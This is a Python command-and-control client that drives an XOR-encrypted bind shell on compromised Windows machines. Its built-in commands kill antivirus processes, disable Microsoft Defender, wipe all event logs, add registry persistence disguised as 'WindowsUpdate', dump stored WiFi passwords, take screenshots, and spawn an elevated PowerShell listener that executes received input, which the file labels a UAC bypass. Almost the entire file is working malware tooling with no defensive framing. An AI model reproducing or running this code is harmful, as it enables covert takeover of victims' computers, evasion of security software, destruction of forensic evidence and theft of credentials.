#!/usr/bin/env python3
"""
C2 Client — XOR encrypted bind shell controller (fixed XOR tracking)
"""
import socket, sys, base64, time

XOR_KEY = bytes([0x42,0x7A,0x1F,0xE3,0x9C,0x55,0xB0,0x2D])
_xpos = 0

# Set to True after a successful per-session key negotiation; both
# this client and the server (main.c) will use the negotiated key for
# all subsequent XOR.  Out-of-band handshake does not advance `_xpos`.
_session_key = None

def xor_reset(off=0):
    global _xpos
    _xpos = off

def _active_key():
    return _session_key if _session_key is not None else XOR_KEY

def xor(b):
    global _xpos
    k = _active_key()
    out = bytearray(len(b))
    for i in range(len(b)):
        out[i] = b[i] ^ k[_xpos % len(k)]
        _xpos += 1
    return bytes(out)

def recv_all(s, timeout=10):
    buf = b""
    s.settimeout(timeout)
    try:
        while True:
            c = s.recv(1)
            if not c: break
            buf += xor(c)
            if b"__C2DONE__" in buf:
                result = buf[:buf.index(b"__C2DONE__")]
                # 排空 TCP 缓冲区中残留数据（同步 _xpos）
                s.settimeout(0.3)
                try:
                    while True:
                        d = s.recv(1)
                        if not d: break
                        xor(d)
                except socket.timeout:
                    pass
                s.settimeout(timeout)
                return result
    except socket.timeout:
        pass
    except ConnectionResetError:
        return None
    return buf

def send_cmd(s, cmd):
    data = (cmd + "\necho __C2DONE__\n").encode()
    s.sendall(xor(data))

def ps_cmd(script):
    b64 = base64.b64encode(script.encode("utf-16le")).decode()
    return f"powershell -NoP -NonI -EncodedCommand {b64}"

def _decode_codepage(raw):
    """Bug-fix: try UTF-8 first (Win10 default Chinese codepage is 65001),
    fall back to GBK (Win7/8/10-Win-codepage setting), finally cp936.
    Original hard-coded gbk and crashed on cmd output from UTF-8 codepage."""
    for enc in ("utf-8", "gbk", "cp936"):
        try:
            return raw.decode(enc)
        except UnicodeDecodeError:
            continue
    return raw.decode("utf-8", errors="replace")

def clean(raw):
    if raw is None: return None
    text = _decode_codepage(raw)
    lines = []
    for l in text.split("\n"):
        l = l.strip()
        if not l or l.startswith("C:\\") or "echo __C2DONE__" in l:
            continue
        lines.append(l)
    return "\n".join(lines)

def pout(raw):
    text = clean(raw)
    if text is None: print("[-] Connection lost"); return
    for l in text.split("\n"):
        if l.strip() and l != "__C2DONE__":
            try: print(l)
            except UnicodeEncodeError:
                print(l.encode("gbk", errors="replace").decode("gbk", errors="replace"))

# ── Commands ──────────────────────────────────────────────────
cmds = {}
def reg(name, help_text, fn): cmds[name] = (help_text, fn)

def cmd_help(a,s):
    for n in sorted(cmds.keys()): print(f"  {n:<15} {cmds[n][0]}")
reg("help","Show help",cmd_help)

def cmd_raw(a,s):
    if len(a)<2: print("Usage: raw <cmd>"); return
    send_cmd(s, " ".join(a[1:])); pout(recv_all(s))
reg("raw","Send raw cmd.exe command",cmd_raw)

def cmd_exec(a,s):
    if len(a)<2: print("Usage: exec <ps_script>"); return
    send_cmd(s, ps_cmd(" ".join(a[1:]))); pout(recv_all(s))
reg("exec","Run PowerShell script",cmd_exec)

def cmd_sysinfo(a,s):
    ps = ("$b=(gp 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion').CurrentBuild;"
          "$r=(gp 'HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion').DisplayVersion;"
          "Write-Output ('BUILD='+$b);Write-Output ('VER='+$r);"
          "Write-Output ('ARCH='+$env:PROCESSOR_ARCHITECTURE);"
          "$il=whoami /groups|findstr 'S-1-16-';"
          "if($il -match '12288'){Write-Output 'ELEV=ADMIN'}"
          "elseif($il -match '16384'){Write-Output 'ELEV=SYSTEM'}"
          "else{Write-Output 'ELEV=USER'}")
    send_cmd(s, ps_cmd(ps)); pout(recv_all(s))
reg("sysinfo","System info",cmd_sysinfo)

def cmd_ps(a,s):
    send_cmd(s, ps_cmd("Get-Process | Select-Object -First 60 Name,Id,CPU | Format-Table -AutoSize"))
    pout(recv_all(s))
reg("ps","Process list",cmd_ps)

def cmd_shell(a,s):
    print("[+] Interactive PowerShell (exit to quit)")
    while True:
        try: c = input("PS> ")
        except (EOFError,KeyboardInterrupt): print();break
        if c in ("exit","quit"): break
        xor_reset()
        send_cmd(s, ps_cmd(c)); pout(recv_all(s))
reg("shell","Interactive PowerShell",cmd_shell)

def cmd_cmd(a,s):
    if len(a)<2: print("Usage: cmd <command>"); return
    send_cmd(s, ps_cmd(" ".join(a[1:]))); pout(recv_all(s))
reg("cmd","Run PowerShell: cmd <command>",cmd_cmd)

def cmd_escalate(a,s):
    ps = ("Start-Process powershell -Verb RunAs -ArgumentList "
          "'-NoP -NonI -W Hidden -c "
          "$l=[Net.Sockets.TcpListener]::new([Net.IPAddress]::Parse('0.0.0.0'),54322);"
          "$l.Start();while(1){$c=$l.AcceptTcpClient();$s=$c.GetStream();"
          "while(1){$b=New-Object byte[] 2048;$n=$s.Read($b,0,2048);"
          "if($n-le0)break;$r=(iex([Text.Encoding]::ASCII.GetString($b,0,$n))2>&1|Out-String);"
          "$x=[Text.Encoding]::ASCII.GetBytes($r+'PS> ');$s.Write($x,0,$x.Length)|Out-Null}}}'")
    print("[*] Spawning elevated listener on 54322...")
    send_cmd(s, ps_cmd(ps)); pout(recv_all(s))
    print("[*] Connect: c2client.py <ip> 54322")
reg("escalate","UAC bypass (admin listener 54322)",cmd_escalate)

def cmd_killav(a,s):
    send_cmd(s, ps_cmd("Get-Process | Where-Object { $_.Name -match 'huorong|360|txplatform|ksoft|kav|avp|bdagent|mcshield|MsMpEng' } | Stop-Process -Force"))
    pout(recv_all(s))
reg("killav","Kill AV processes",cmd_killav)

def cmd_disabledefender(a,s):
    send_cmd(s, ps_cmd("Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true; New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender' -Name DisableAntiSpyware -Value 1 -Force"))
    pout(recv_all(s))
reg("disabledefender","Disable Defender",cmd_disabledefender)

def cmd_clearlogs(a,s):
    send_cmd(s, ps_cmd("wevtutil el | %{ wevtutil cl '$_' }"))
    pout(recv_all(s))
reg("clearlogs","Clear event logs",cmd_clearlogs)

def cmd_persist(a,s):
    send_cmd(s, ps_cmd("$p=(Get-Process -Id $pid).Path; New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'WindowsUpdate' -Value $p -Force"))
    pout(recv_all(s))
reg("persist","HKCU Run persistence",cmd_persist)

def cmd_wifi(a,s):
    send_cmd(s, ps_cmd("(netsh wlan show profiles) | Select-String ':' | %{$p=$_.ToString().Split(':')[1].Trim(); netsh wlan show profile name=$p key=clear} | Select-String 'Key Content|Profile'"))
    pout(recv_all(s))
reg("wifi","Dump WiFi passwords",cmd_wifi)

def cmd_screenshot(a,s):
    ps = ("Add-Type -AssemblyName System.Drawing;"
          "$s=[Drawing.Rectangle]::FromLTRB(0,0,[int]([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width),[int]([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height));"
          "$b=new-object Drawing.Bitmap $s.Width,$s.Height;"
          "$g=[Drawing.Graphics]::FromImage($b);"
          "$g.CopyFromScreen(0,0,0,0,$s.Size);"
          "$b.Save('C:\\Windows\\Temp\\scr.png');"
          "Write-Output 'Saved to C:\\Windows\\Temp\\scr.png'")
    send_cmd(s, ps_cmd(ps)); pout(recv_all(s))
reg("screenshot","Screenshot (C:\\Windows\\Temp\\scr.png)",cmd_screenshot)

reg("exit","Exit",lambda a,s:("__EXIT__",None))
reg("quit","Exit",lambda a,s:("__EXIT__",None))
reg("q","Exit",lambda a,s:("__EXIT__",None))

# ── Main ──────────────────────────────────────────────────────
def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "192.168.30.17"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 54321
    s = socket.socket()
    try: s.connect((host, port))
    except Exception as e: print(f"[-] {e}"); sys.exit(1)
    print(f"[+] Connected to {host}:{port}")

    # Per-session XOR negotiation (matches main.c _xor_negotiate).
    # 8 plaintext bytes for key, then 3-byte "OK\n" XOR'd with it.
    try:
        key = b""
        while len(key) < 8:
            chunk = s.recv(8 - len(key))
            if not chunk: raise IOError("server closed during key exchange")
            key += chunk
        # ack = "OK\n" XOR'd with key
        ack = bytes(b ^ key[i] for i, b in enumerate(b"OK\n"))
        s.sendall(ack)
        global _session_key
        _session_key = key
        print(f"[+] Session key: {key.hex()}")
    except Exception as e:
        # Server may not have ENABLE_SESSION_KEY; fall back to static.
        print(f"[*] No session negotiation ({e}); using static XOR")
        _session_key = None

    xor_reset()
    send_cmd(s, "whoami")
    pout(recv_all(s))

    while True:
        try: inp = input(f"c2[{host}]> ")
        except (EOFError, KeyboardInterrupt): print();break
        parts = inp.split()
        if not parts: continue
        cmd = parts[0].lower()
        if cmd in cmds:
            result = cmds[cmd][1](parts, s)
            if result and result[0] == "__EXIT__": break
        else:
            send_cmd(s, ps_cmd(inp))
            pout(recv_all(s))

    try: s.close()
    except: pass

if __name__ == "__main__":
    main()
